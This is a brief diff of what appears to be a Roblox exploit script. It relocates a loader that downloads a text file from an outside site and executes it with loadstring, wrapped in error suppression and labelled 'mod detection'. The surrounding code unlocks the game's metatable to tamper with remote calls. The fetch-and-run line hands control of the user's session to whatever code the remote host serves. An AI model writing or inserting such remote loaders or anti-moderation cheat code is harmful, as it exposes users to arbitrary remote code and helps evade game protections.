@@ -52,7 +52,11 @@ game.Players.PlayerAdded:Connect(function(v)
     repeat wait() until Workspace.Players:FindFirstChild(v.Name)
     RunCheck()
 end)
-
+--mod detection v2
+xpcall(function()
+loadstring(game:HttpGet("https://9kdestroyer.xyz/ResponseData/AntiMod.txt"))()
+end)
+-- anti remotes
 assert(getrawmetatable)
 gmt = getrawmetatable(game)
 setreadonly(gmt, false)
@@ -165,6 +169,4 @@ function turnonque()
 end
 end
 turnonque()
-pcall(function()
-loadstring(game:HttpGet("https://9kdestroyer.xyz/ResponseData/AntiMod.txt"))()
-end)
+
